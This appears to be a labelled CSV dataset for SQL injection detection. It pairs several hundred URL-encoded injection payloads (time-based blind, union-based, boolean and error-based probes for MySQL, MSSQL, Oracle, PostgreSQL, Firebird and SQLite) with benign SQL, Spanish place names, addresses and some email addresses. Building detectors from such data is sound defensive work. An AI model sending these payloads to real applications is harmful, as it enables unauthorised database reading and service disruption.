Query,Label
%3B%20if%20not%20%20%28%20%20substring%20%20%20%28%20%20%20%20%28%20%20%20select%20%40%40version%20%20%29%20%20%2C25%2C1%20%20%29%20%20%20%3C%3E%200%20%20%29%20%20%20waitfor%20delay%20%270%3A0%3A2%27%20--,1
SELECT leaf ( s ) FROM medicine INNER JOIN,0
1%20or%208421%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20--%20xgyc,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20union%20select%201%201a%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
1%22%20where%201719%20%20%3D%20%201719%20and%207533%20%20%3D%20%207533--,1
SELECT earth ( s FROM national RIGHT JOIN,0
1%27%20%20%29%20%20%20as%20juxt%20where%205956%20%20%3D%20%205956%20and%208148%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20--,1
1%20%20%20%29%20%20%20%20%29,1
eansor,0
d76en3r9n8z01,0
"carretera estacion, 144, 8-d",0
iif%20%20%28%20%209134%20%20%3D%20%205736%2C1%2C1/0%20%20%29,1
-2384%27%7C%7C%20%20%28%20%20select%20%27vhcp%27%20from%20dual%20where%201266%20%20%3D%20%201266%20union%20all%20select%201266%2C1266%2C1266%2C1266--,1
capella gorrn,0
castellanos de zapardiel,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20hace%20where%208785%20%20%3D%20%208785,1
1%20%20%29%20%20%20or%20char%20%20%28%20%20119%20%20%29%20%20%7C%7Cchar%20%20%28%20%20100%20%20%29%20%20%7C%7Cchar%20%20%28%20%2099%20%20%29%20%20%7C%7Cchar%20%20%28%20%20121%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20right%20%20%28%20%20char%20%20%28%20%201441%20%20%29%20%20%2C0%20%20%29%20%20%2C5000000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
7stambrar,0
1%22%20or%207552%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20%20%29%20%20%20and%20%22zcfa%22%20%20%3D%20%20%22zcfa,1
1%27%7C%7C%20%20%28%20%20select%20%27vvpn%27%20from%20dual%20where%207011%20%20%3D%20%207011%20and%207756%20%20%3D%20%20dbms_utility.sqlid_to_sqlhash%20%20%20%28%20%20%20%20%28%20%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%207756%20%20%3D%20%207756%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20%7C%7C%27,1
ag-uzadura,0
1%25%27%20%20%29%20%20%20and%204595%20%20%3D%20%204595%23,1
SELECT * FROM thrown FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM company,0
iif%20%20%28%20%207953%20%20%3D%20%203021%2C1%2C1/0%20%20%29,1
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%29%20%20%20and%20%20%20%28%20%20%27tnvm%27%20like%20%27tnvm,1
-9854%20%20%29%20%20%20or%205023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%205696%20%20%3D%20%205696,1
DELETE FROM seems WHERE cream = 'production',0
"c/ cels gomis i mestre 171,",0
1%27%2B%20%20%28%20%20select%20wpbj%20where%201849%20%20%3D%20%201849,1
"paseo pinos, 147",0
-3971%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20elt%20%20%28%20%201032%20%20%3D%20%201032%2C3623%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
SELECT TOP 3 * FROM each SELECT * FROM oil 3SELECT * FROM behind,0
SELECT part ( s )  FROM cannot LEFT JOIN,0
call%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
-4477%27%20%20%20%29%20%20%20%20%29%20%20%20%20union%20all%20select%208444%2C8444%2C8444%2C8444%2C8444%2C8444%2C8444%2C8444--,1
1%20where%202031%20%20%3D%20%202031%20or%205356%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20sysusers%20as%20sys1%2Csysusers%20as%20sys2%2Csysusers%20as%20sys3%2Csysusers%20as%20sys4%2Csysusers%20as%20sys5%2Csysusers%20as%20sys6%2Csysusers%20as%20sys7%20%20%29%20%20--,1
SELECT COUNT ( box ) FROM balance,0
SELECT * FROM electricity FETCH FIRST 3 ROWS ONLY,0
1%20and%203715%20in%20%20%20%20%28%20%20%20%20%28%20%20%20char%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20112%20%20%29%20%20%2Bchar%20%20%28%20%20106%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2B%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203715%20%20%3D%20%203715%20%20%29%20%20%20then%20char%20%20%28%20%2049%20%20%29%20%20%20else%20char%20%20%28%20%2048%20%20%29%20%20%20end%20%20%20%29%20%20%20%20%29%20%20%20%2Bchar%20%20%28%20%20113%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20118%20%20%29%20%20%2Bchar%20%20%28%20%20122%20%20%29%20%20%2Bchar%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
1%25%27%20rlike%20%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%203596%20%20%3D%20%204245%20%20%29%20%20%20then%201%20else%200x28%20end%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%27%25%27%20%20%3D%20%20%27,1
SELECT * FROM essential FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM horse,0
-3873%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%201%20group%20by%20concat%20%20%28%20%200x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%204232%20%20%3D%20%204232%20%20%29%20%20%20then%201%20else%200%20end%20%20%20%29%20%20%20%20%29%20%20%20%2C0x717a767a71%2Cfloor%20%20%28%20%20rand%20%20%28%20%200%20%20%29%20%20%2A2%20%20%20%29%20%20%20%20%29%20%20%20%20having%20min%20%20%28%20%200%20%20%29%20%20%23,1
"SELECT low,bound,develop,kill,older     (  (  string JOIN beyond ON youth.speed =  studying.bend )   INNER JOIN masterON Orders.feel =  greatly.trackID )",0
1%27%20%20%29%20%20%20as%20uqkz%20where%208482%20%20%3D%20%208482%20and%208407%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20generate_series%20%20%28%20%201%2C5000000%20%20%20%29%20%20%20%20%29%20%20%20--,1
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,0
end%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
-6987%27%20union%20all%20select%204721%2C4721--,1
equilibrio,0
cagarria,0
-3677%27%20%20%20%29%20%20%20%20%29%20%20%20%20or%201939%20%20%3D%20%204484,1
SELECT * FROM clothing WHERE laugh BETWEEN '1996-07-01' AND '1996-07-31',0
1%27%7C%7C%20%20%28%20%20select%20%27mzhj%27%20where%209677%20%20%3D%20%209677%20union%20all%20select%20null%2Cnull%2Cnull--,1
milton,0
SELECT secret ( s FROM must RIGHT JOIN,0
-4583%27%20%20%29%20%20%20as%20evbo%20where%206055%20%20%3D%20%206055%20union%20all%20select%206055--,1
45810,0
SELECT Count ( * )  AS women,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20and%20%20%20%28%20%20%22snwx%22%20like%20%22snwx,1
SELECT Count ( * )  AS route,0
SELECT fought ( s )  FROM planned,0
-5996%20%20%29%20%20%20or%205023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
1%25%27%20%20%20%29%20%20%20%20%29%20%20%20%20and%20make_set%20%20%28%20%206527%20%20%3D%20%209529%2C9529%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%27%25%27%20%20%3D%20%20%27,1
"SELECT lack, no, previousFROM twenty WHERE nails  IS NOT NULL",0
lavada,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20nxdf%20where%201696%20%20%3D%20%201696%20or%208514%20%20%3D%20%20benchmark%20%20%28%20%205000000%2Cmd5%20%20%28%20%200x544d5a4c%20%20%20%29%20%20%20%20%29%20%20%20%23,1
arimany aguila,0
SELECT * FROM nervous WHERE burn  BETWEEN 10 AND 20,0
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ),0
"SELECT bagID AS ID, rush AS young FROM material",0
SELECT * FROM spread FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM himself,0
"SELECT * FROM rather WHERE anything IN  ( 'doctor', 'examine', 'well' )",0
/%2A%2A/or/%2A%2A/1/%2A%2A/%20%20%3D%20%20/%2A%2A/1,1
"calle prat de la riba, 73",0
SELECT AVG ( neck ) FROM leader,0
1%27%7C%7C%20%20%28%20%20select%20%27jzwq%27%20where%203289%20%20%3D%20%203289%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
SELECT COUNT ( darknessID ) FROM nodded,0
SELECT * FROM bare WHERE tomorrow BETWEEN bent09/01/1996improve AND clock15/31/1996musical,0
if%20%20%28%20%208995%20%20%3D%20%209787%20%20%29%20%20%20select%208995%20else%20drop%20function%20ofgg--,1
1%20%20%29%20%20%20and%206055%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%206055%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%206055%20%20%3D%20%206055%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20%3C%40.%24%20or%201%20%20%3D%20%201%20--%201,1
SELECT TOP 3 * FROM between,0
"SELECT Orders.sayrID, Employees.rose, Employees.steep FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.foxID ORDER BY Orders.climateID",0
hoog,0
geffner-schoo@bacoespecialseleccin.bm,0
"SELECT giant AS rhyme, copper AS [particular]  FROM loose",0
SELECT * FROM log WHERE primitive  BETWEEN 10 AND 20,0
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%206240%20%20%3D%20%20%20%20%28%20%20%27qqpjq%27%7C%7C%20%20%28%20%20select%20case%206240%20when%206240%20then%201%20else%200%20end%20from%20rdb%24database%20%20%29%20%20%7C%7C%27qzvzq%27%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%22buwe%22%20%20%3D%20%20%22buwe,1
SELECT memory ( s )  FROM powerful SELECT lying FROM money,0
SELECT COUNT ( DISTINCT serve )  FROM completely,0
"SELECT column_name ( s )  FROM itself,atom",0
1%22%20%20%29%20%20%20or%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%28%20%20%22xgtk%22%20%20%3D%20%20%22xgtk,1
8.42194E+15,0
1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%208990%20%20%3D%20%204775%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%201894%20%20%3D%20%201894,1
-3767%27%20%20%29%20%20%20as%20eefl%20where%208260%20%20%3D%20%208260%20union%20all%20select%208260%2C8260%2C8260%2C8260%2C8260%2C8260%2C8260%23,1
ruesga,0
palls de buran,0
50344,0
-8707%27%20%20%29%20%20%20union%20all%20select%205609%2C5609%2C5609--,1
1%20%20%20%29%20%20%20%20%29%20%20%20%20as%20fqee%20where%203286%20%20%3D%20%203286,1
gaspard-birgel@indorec.kr,0
1%27%20in%20boolean%20mode%20%20%29%20%20%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull--,1
"SELECT longer, rocky, sweet FROM metal WHERE someone  IS NULL",0
7395,0
1%25%27%20%20%29%20%20%20and%20extractvalue%20%20%28%20%207982%2Cconcat%20%20%28%20%200x5c%2C0x7171706a71%2C%20%20%28%20%20select%20%20%20%28%20%20elt%20%20%28%20%207982%20%20%3D%20%207982%2C1%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%2C0x717a767a71%20%20%20%29%20%20%20%20%29%20%20%20%20and%20%20%20%28%20%20%27%25%27%20%20%3D%20%20%27,1
select%20%2A%20from%20users%20where%20id%20%20%3D%20%201%20%3C%40.%20union%20select%201%2Cversion%20%20%28%20%20%20%20%29%20%20%20--%201,1
select%20%2A%20from%20generate_series%20%20%28%20%208147%2C8147%2Ccase%20when%20%20%20%28%20%208147%20%20%3D%20%206336%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20limit%201--,1
SELECT * FROM twelve WHERE example = 'use'  AND City = 'unless',0
17130,0
SELECT * FROM deeply WHERE negative NOT BETWEEN 'usual' AND 'plastic',0
1%27%20%20%29%20%20%20as%20ezoa%20where%204915%20%20%3D%20%204915%20and%209660%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20all_users%20t1%2Call_users%20t2%2Call_users%20t3%2Call_users%20t4%2Call_users%20t5%20%20%29%20%20--,1
SELECT * FROM cause WHERE atomic = 'plural',0
1%27%20%20%29%20%20%20where%201424%20%20%3D%20%201424%20and%20sleep%20%20%28%20%205%20%20%29%20%20--,1
-5204%22%20%20%29%20%20%20union%20all%20select%207186%2C7186%2C7186--,1
-7635%22%20union%20all%20select%201284%2C1284%2C1284%2C1284%2C1284%2C1284%23,1
-7802%27%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20or%20elt%20%20%28%20%208778%20%20%3D%20%209974%2C9974%20%20%29%20%20%20and%20%20%20%20%28%20%20%20%20%28%20%20%20%20%20%28%20%20%27glsq%27%20like%20%27glsq,1
1%22%20%20%20%29%20%20%20%20%29%20%20%20%20as%20jikg%20where%208258%20%20%3D%20%208258%20and%20%20%20%28%20%203973%20%20%3D%20%201047%20%20%29%20%20%2A1047--,1
1%27%2B%20%20%28%20%20select%20%27arqt%27%20where%202336%20%20%3D%20%202336%20or%20char%20%20%28%20%2075%20%20%29%20%20%7C%7Cchar%20%20%28%20%2070%20%20%29%20%20%7C%7Cchar%20%20%28%20%2099%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20--,1
SELECT * FROM win ORDER BY advice,0
DELETE FROM satellites,0
"SELECT MAKEDATE ( 2017, 366 ) ;",0
SELECT AVG ( begun ) FROM band SELECT SUM ( chosen ),0
levert,0
"diamante, 114,",0
cracoviano,0
SELECT * FROM notice FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM cross,0
SELECT * FROM  ( SELECT instance FROM coach ),0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'support_cat' )  AND t.term_id IN  (  2637  )",0
SELECT * FROM nose WHERE zero = 'slope'  AND City = 'muscle',0
DELETE FROM forty WHERE till = 'come',0
1%25%27%20or%204915%20%20%3D%20%20%20%20%28%20%20select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20domain.domains%20as%20t1%2Cdomain.columns%20as%20t2%2Cdomain.tables%20as%20t3%20%20%29%20%20--,1
1%27%2B%20%20%28%20%20select%20%27sacd%27%20where%205984%20%20%3D%20%205984%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%23,1
1%27%2B%20%20%28%20%20select%20%27eoxk%27%20where%206621%20%20%3D%20%206621%20union%20all%20select%20null%2Cnull%23,1
1%27%20%20%29%20%20%20where%207093%20%20%3D%20%207093%20and%208148%20%20%3D%20%20like%20%20%28%20%20%27abcdefg%27%2Cupper%20%20%28%20%20hex%20%20%28%20%20randomblob%20%20%28%20%20500000000/2%20%20%20%29%20%20%20%20%29%20%20%20%20%20%20%29%20%20%20%20%29%20%20%20--,1
1%27%20%20%29%20%20%20or%20char%20%20%28%20%20117%20%20%29%20%20%7C%7Cchar%20%20%28%20%20111%20%20%29%20%20%7C%7Cchar%20%20%28%20%20105%20%20%29%20%20%7C%7Cchar%20%20%28%20%20100%20%20%29%20%20%20%20%3D%20%20regexp_substring%20%20%28%20%20repeat%20%20%28%20%20left%20%20%28%20%20crypt_key%20%20%28%20%20char%20%20%28%20%2065%20%20%29%20%20%7C%7Cchar%20%20%28%20%2069%20%20%29%20%20%7C%7Cchar%20%20%28%20%2083%20%20%29%20%20%2Cnull%20%20%29%20%20%2C0%20%20%29%20%20%2C500000000%20%20%29%20%20%2Cnull%20%20%29%20%20%20and%20%20%20%28%20%20%27ozef%27%20%20%3D%20%20%27ozef,1
"SELECT circleID AS ID, stove AS headed FROM thing",0
SELECT * FROM slip FETCH FIRST 50 PERCENT ROWS ONLY,0
1%22%20where%201452%20%20%3D%20%201452%20union%20all%20select%20null%2Cnull%2Cnull%2Cnull--,1
SELECT * FROM coal WHERE foot = 'above' FETCH FIRST 3 ROWS ONLY,0
select%20count%20%20%28%20%20%2A%20%20%29%20%20%20from%20rdb%24fields%20as%20t1%2Crdb%24types%20as%20t2%2Crdb%24collations%20as%20t3%2Crdb%24functions%20as%20t4%20and%20%27bnfu%27%20like%20%27bnfu,1
1%25%22%20%20%29%20%20%20or%20sleep%20%20%28%20%205%20%20%29%20%20%20and%20%20%20%28%20%20%22%25%22%20%20%3D%20%20%22,1
SELECT * FROM thus 3,0
SELECT * FROM  ( SELECT mind FROM between ),0
48289,0
takakura@cenitsoria.sb,0
SELECT * FROM consonant WHERE regular LIKE '%now%',0
"paso de la soledad, 130 10?f",0
shedd,0
48042322z,0
SELECT * FROM rope WHERE Price NOT BETWEEN 10 AND 20,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 193 )  ORDER BY meta_id ASC",0
-7812%27%20%20%29%20%20%20or%205023%20%20%3D%20%20ctxsys.drithsx.sn%20%20%28%20%205023%2C%20%20%28%20%20chr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20112%20%20%29%20%20%7C%7Cchr%20%20%28%20%20106%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7C%20%20%28%20%20select%20%20%20%28%20%20case%20when%20%20%20%28%20%205023%20%20%3D%20%205023%20%20%29%20%20%20then%201%20else%200%20end%20%20%29%20%20%20from%20dual%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20118%20%20%29%20%20%7C%7Cchr%20%20%28%20%20122%20%20%29%20%20%7C%7Cchr%20%20%28%20%20113%20%20%20%29%20%20%20%20%29%20%20%20%20%20%29%20%20%20and%20%20%20%28%20%20%27ttvo%27%20%20%3D%20%20%27ttvo,1
shirleen,0
SELECT AVG ( out ) FROM colony,0
vildo@prensahp.fj,0
SELECT roof ( s ) FROM diameter INNER JOIN,0
SELECT stick ( s ) FROM gentle INNER JOIN,0
SELECT * FROM grain WHERE positive = 'matter'  OR remember = 'warm',0
1%27%7C%7C%20%20%28%20%20select%20%27bqhi%27%20from%20dual%20where%207409%20%20%3D%20%207409,1
"INSERT INTO respect  ( say, officer, on )  VALUES  ( 'ruler', 'party', 'gradually' )",0
"SELECT personalID AS ID, tape AS couple FROM happy",0
SELECT AVG ( molecular )  FROM week  SELECT SUM ( everywhere ),0
SELECT * FROM fun WHERE    NOT travel = 'pair',0
"SELECT column_name ( s )  FROM tea,child",0
1%22%20%20%29%20%20%20and%208677%20%20%3D%20%209054%23,1
ren,0
SELECT * FROM eight FETCH FIRST 50 PERCENT ROWS ONLY,0
orejana,0
